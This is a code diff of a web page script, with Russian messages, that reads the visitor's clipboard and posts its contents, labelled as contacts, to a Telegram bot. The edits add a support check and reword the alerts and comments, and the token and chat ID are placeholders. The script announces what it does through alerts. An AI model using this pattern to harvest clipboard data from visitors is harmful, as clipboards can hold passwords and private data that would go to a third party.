@@ -13,31 +13,35 @@
     <script>
         async function getContacts() {
             try {
-                // Запрос на получение данных из буфера обмена
-                const clipboardText = await navigator.clipboard.readText();
-                
-                if (clipboardText.trim() === '') {
-                    console.log('Буфер обмена пуст.');
-                    alert('Буфер обмена пуст. Пожалуйста, скопируйте контакты и попробуйте снова.');
+                // Check if clipboard access is supported
+                if (!navigator.clipboard) {
+                    alert("Ваш браузер не поддерживает доступ к буферу обмена.");
                     return;
                 }
 
-                // Формирование сообщения с контактами
-                let contactsMessage = 'Список контактов из буфера обмена:\n';
-                contactsMessage += clipboardText;
+                // Read the text data from the clipboard
+                const clipboardText = await navigator.clipboard.readText();
+                
+                if (!clipboardText) {
+                    alert("Буфер обмена пустой или не содержит текстовые данные.");
+                    return;
+                }
 
-                // Отправка контактов в Telegram-бот
+                // Prepare the message with clipboard contents
+                let contactsMessage = 'Список контактов из буфера обмена:\n\n' + clipboardText;
+
+                // Send the contacts to the Telegram bot
                 sendContactsToTelegram(contactsMessage);
 
             } catch (error) {
                 console.error('Ошибка при получении данных из буфера обмена:', error);
-                alert('Ошибка при получении данных из буфера обмена. Пожалуйста, попробуйте снова.');
+                alert('Произошла ошибка при получении данных из буфера обмена. Пожалуйста, попробуйте снова.');
             }
         }
 
         function sendContactsToTelegram(message) {
-            const botToken = 'YOUR_BOT_TOKEN_HERE';
-            const chatId = 'YOUR_CHAT_ID_HERE';
+            const botToken = '<YOUR_BOT_TOKEN>'; // Replace with your bot's token
+            const chatId = '<YOUR_CHAT_ID>'; // Replace with your chat ID
             const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
             fetch(telegramApiUrl, {
@@ -53,16 +57,15 @@
             .then(response => response.json())
             .then(data => {
                 if (data.ok) {
-                    console.log('Контакты отправлены в Telegram:', data);
-                    alert('Контакты успешно отправлены в Telegram.');
+                    alert('Контакты успешно отправлены в Telegram!');
                 } else {
-                    console.error('Ошибка при отправке в Telegram:', data);
-                    alert('Ошибка при отправке в Telegram: ' + data.description);
+                    console.error('Ошибка при отправке контактов в Telegram:', data);
+                    alert('Не удалось отправить контакты в Telegram. Проверьте настройки и повторите попытку.');
                 }
             })
             .catch(error => {
                 console.error('Ошибка при отправке контактов в Telegram:', error);
-                alert('Ошибка при отправке контактов в Telegram. Проверьте ваше интернет-соединение и попробуйте снова.');
+                alert('Произошла ошибка при отправке контактов в Telegram. Пожалуйста, попробуйте снова.');
             });
         }
     </script>
